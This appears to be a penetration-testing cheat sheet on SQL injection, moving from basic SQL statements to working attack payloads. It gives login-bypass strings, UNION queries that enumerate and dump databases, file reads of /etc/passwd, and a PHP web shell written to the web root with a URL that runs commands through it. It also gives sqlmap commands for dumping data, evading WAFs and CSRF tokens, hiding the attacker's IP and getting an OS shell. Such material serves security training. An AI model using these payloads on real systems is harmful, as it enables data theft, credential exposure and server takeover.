# SQL Injection

Most modern web applications utilize a database structure on the back-end. Such databases are used to store and retrieve data related to the web application, from actual web content to user information and content, and so on. To make the web applications dynamic, the web application has to interact with the database in real-time. As HTTP(S) requests arrive from the user, the web application's back-end will issue queries to the database to build the response. These queries can include information from the HTTP(S) request or other relevant information.

## SQL Logic

### Statements

**INSERT**
````
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
````
**SELECT**
````
SELECT * FROM table_name;
SELECT column1, column2 FROM table_name;
SELECT username,password FROM logins;
````
**DROP**
````
DROP TABLE logins;
````
**ALTER**
````
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn; (RENAME COLUMN)
ALTER TABLE logins MODIFY newerColumn DATE; (Change a column's datatype with MODIFY)
ALTER TABLE logins DROP newerColumn; (Drop a column using DROP)
````
**Update**
````
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
UPDATE logins SET password = 'change_password' WHERE id > 1;
````

### Query Results

**ORDER BY**
````
SELECT * FROM logins ORDER BY password;
SELECT * FROM logins ORDER BY password DESC;
SELECT * FROM logins ORDER BY password DESC, id ASC;
````
**LIMIT**
````
SELECT * FROM logins LIMIT 2;
SELECT * FROM logins LIMIT 1, 2; (the offset marks the order of the first record to be included, starting from 0. For the above, it starts and includes the 2nd record, and returns two values.)
````
**WHERE**
````
SELECT * FROM table_name WHERE <condition>;
SELECT * FROM logins WHERE id > 1;
SELECT * FROM logins where username = 'admin';
````
**LIKE**

SQL clause is LIKE, enabling selecting records by matching a certain pattern.
````
SELECT * FROM logins WHERE username LIKE 'admin%';
SELECT * FROM logins WHERE username like '___';
````
The % symbol acts as a wildcard and matches all characters after admin. It is used to match zero or more characters. Similarly, the _ symbol is used to match exactly one character.

### SQL Operators

**AND Operator**
````
condition1 AND condition2
SELECT 1 = 1 AND 'test' = 'test';
SELECT 1 = 1 AND 'test' = 'abc';
````
In MySQL terms, any non-zero value is considered true, and it usually returns the value 1 to signify true. 0 is considered false.

**OR Operator**

The OR operator takes in two expressions as well, and returns true when at least one of them evaluates to true:
````
SELECT 1 = 1 OR 'test' = 'abc';
SELECT 1 = 2 OR 'test' = 'abc';
````

**NOT Operator**

The NOT operator simply toggles a boolean value 'i.e. true is converted to false and vice versa':
````
SELECT NOT 1 = 1;
SELECT NOT 1 = 2;
````
The first query resulted in false because it is the inverse of the evaluation of 1 = 1, which is true, so its inverse is false. On the other hand, the second query returned true, as the inverse of 1 = 2 'which is false' is true.

**Symbol Operators**

The AND, OR and NOT operators can also be represented as &&, || and !, respectively.
````
SELECT 1 = 1 && 'test' = 'abc';
SELECT 1 = 1 || 'test' = 'abc';
SELECT 1 != 1;
````

## SQL Injection

Injection occurs when an application misinterprets user input as actual code rather than a string, changing the code flow and executing it. This can occur by escaping user-input bounds by injecting a special character like ('), and then writing code to be executed, like JavaScript code or SQL in SQL Injections. Unless the user input is sanitized, it is very likely to execute the injected code and run it.

**Comments**

Comments are used to document queries or ignore a certain part of the query. We can use two types of line comments with MySQL -- and #, in addition to an in-line comment /**/ (though this is not usually used in SQL injections).

### Auth Bypass

Query
````
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
````

| Payload | URL Encoded |
|---------|-------------|
| '       | %27         |
| "       | %22         |
| #       | %23         |
| ;       | %3B         |
| )       | %29         |

````
SELECT * FROM logins WHERE username=''' AND password = 'something';
````
**OR Injection**
````
admin' or '1'='1
' or '1'='1' -- -
' or '1'='1' #
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
SELECT * FROM logins WHERE username='' or '1'='1' -- - ' AND password = 'something';
SELECT * FROM logins WHERE username='' or '1'='1' # ' AND password = 'something';
````

## Union Injection

The Union clause is used to combine results from multiple SELECT statements. This means that through a UNION injection, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases.

**Detect number of columns**
````
' order by 1-- -
' order by 2-- -
````
When the application returns an error, it means that we have exceeded the number of columns in that table.

**Detect Fiels**
````
cn' UNION select 1,2,3-- -
````
Check where the numbers appear in the “table” on the page.
While a query may return multiple columns, the web application may only display some of them. So, if we inject our query in a column that is not printed on the page, we will not get its output. This is why we need to determine which columns are printed to the page, to determine where to place our injection.
````
cn' UNION select 1,@@version,3,4-- -
````

### Database Enumeration

**INFORMATION_SCHEMA Database**

To pull data from tables using UNION SELECT, we need to properly form our SELECT queries. To do so, we need the following information:

- List of databases
- List of tables within each database
- List of columns within each table

The first three databases are default MySQL databases and are present on any server, so we usually ignore them during DB enumeration. Sometimes there's a fourth 'sys' DB as well.
- mysql
- information_schema
- performance_schema
- sys

List all databases
````
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
````
List current database
````
cn' UNION select 1,database(),2,3-- -
````

**Tables**

List all tables from specific database
````
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<database>'-- -
````

**Columns**

List all columns from specific table
````
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<table_name>'-- -
````

**Dump data**

Dump data from specific table
````
cn' UNION select 1, <column1>, <column2>, 4 from <database>.<table>-- -
````

#### Privileges

**DB User**
````
cn' UNION SELECT 1, user(), 3, 4-- -
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
````
**User Privileges**
````
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="<user>"-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
````
The query returns Y, which means YES, indicating superuser privileges.
If we see the FILE privilege, it means we can read and write, but we need to understand whether we are restricted or have total freedom.
````
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
````
The secure_file_priv variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, NULL means we cannot read/write from any directory.


### Reading Files
 
**LOAD_FILE**
````
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
````

### Writing Files

**SELECT INTO OUTFILE**
````
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
````
**Web Shell**
````
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`

http://SERVER_IP:PORT/shell.php?0=id
````


## Automate with SQLMAP

### Build Attacks

**cURL Command**
````
$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
````
**GET/POST Requests**
````
$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
$ sqlmap 'http://www.example.com/?uid=1*'
````
**Full HTTP Requests**
````
$ sqlmap -r req.txt
````
**Custom SQLMap Requests**
````
$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
$ sqlmap -u www.target.com --data='id=1' --method PUT
-A/--user-agent
 --random-agent designed to randomly select a User-agent header value from the included database of regular browser values. 
````
**Prefix/Suffix**
````
$ sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
````
This will result in an enclosure of all vector values between the static prefix %')) and the suffix -- -.

**Level/Risk**

For such demands, the options --level and --risk should be used:
- The option --level (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
- The option --risk (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
````
$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3
````

### Database Enumeration

Enumeration usually starts with the retrieval of the basic information:
- Database version banner (switch --banner)
- Current user name (switch --current-user)
- Current database name (switch --current-db)
- Checking if the current user has DBA (administrator) rights (switch --is-dba)
````
$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
````
**Database**
````
$ sqlmap -u "http://www.example.com/?id=1" --dbs
$ sqlmap -u "http://www.example.com/?id=1" --current-db
````
**Table Enumeration**
````
$ sqlmap -u "http://www.example.com/?id=1" --tables -D <database>
````
**Dump Data**
````
$ sqlmap -u "http://www.example.com/?id=1" --dump -T <table> -D <database>
$ sqlmap -u "http://www.example.com/?id=1" --dump -D <database>
$ sqlmap -u "http://www.example.com/?id=1" --dump-all
````
**Table/Row Enumeration**

When dealing with large tables with many columns and/or rows, we can specify the columns (e.g., only name and surname columns) with the -C option, as follows:
````
$ sqlmap -u "http://www.example.com/?id=1" --dump -T <table> -D <database> -C <column1>,<column2>
$ sqlmap -u "http://www.example.com/?id=1" --dump -T <table> -D <database> --start=2 --stop=3
````
**Conditional Enumeration**
````
$ sqlmap -u "http://www.example.com/?id=1" --dump -T <table> -D <database> --where="<column1> LIKE 'f%'"
````
**DB Schema Enumeration**
````
$ sqlmap -u "http://www.example.com/?id=1" --schema
````
**Searching for Data**
````
$ sqlmap -u "http://www.example.com/?id=1" --search -T user
$ sqlmap -u "http://www.example.com/?id=1" --search -C pass

T (tables) | C (Columns)
````

###  Bypassing Web Application Protections

**Anti-CSRF Token Bypass**
````
$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
````
Unique Value Bypass
````
$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
````
Calculated Parameter Bypass
````
$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
````

**IP Address Concealing**

In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the option --proxy (e.g. --proxy="socks4://177.39.187.70:33283"), where we should add a working proxy.

**WAF Bypass**

In case of a positive detection, to identify the actual protection mechanism, SQLMap uses a third-party library identYwaf, containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switch --skip-waf.

**User-agent Blacklisting Bypass**

This is trivial to bypass with the switch --random-agent, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.

**Tamper Scripts**

| Tamper-Script               | Description                                                                                                     |
|-----------------------------|-----------------------------------------------------------------------------------------------------------------|
| 0eunion                     | Replaces instances of UNION with e0UNION                                                                       |
| base64encode                | Base64-encodes all characters in a given payload                                                               |
| between                     | Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #       |
| commalesslimit              | Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart                                   |
| equaltolike                 | Replaces all occurrences of operator equal (=) with LIKE counterpart                                           |
| halfversionedmorekeywords   | Adds (MySQL) versioned comment before each keyword                                                              |
| modsecurityversioned        | Embraces complete query with (MySQL) versioned comment                                                          |
| modsecurityzeroversioned    | Embraces complete query with (MySQL) zero-versioned comment                                                     |
| percentage                  | Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                            |
| plus2concat                 | Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart                                          |
| randomcase                  | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                 |
| space2comment               | Replaces space character ( ) with comments `/                                                                  |
| space2dash                  | Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n)          |
| space2hash                  | Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n) |
| space2mssqlblank            | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters |
| space2plus                  | Replaces space character ( ) with plus (+)                                                                     |
| space2randomblank           | Replaces space character ( ) with a random blank character from a valid set of alternate characters            |
| symboliclogical             | Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)                             |
| versionedkeywords           | Encloses each non-function keyword with (MySQL) versioned comment                                               |
| versionedmorekeywords       | Encloses each keyword with (MySQL) versioned comment                                                            |

### OS Exploitation

**Checking for DBA Privileges**
````
$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
````

**File Read/Write**
````
$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
````

**OS Command Execution**
````
$ sqlmap -u "http://www.example.com/?id=1" --os-shell
````
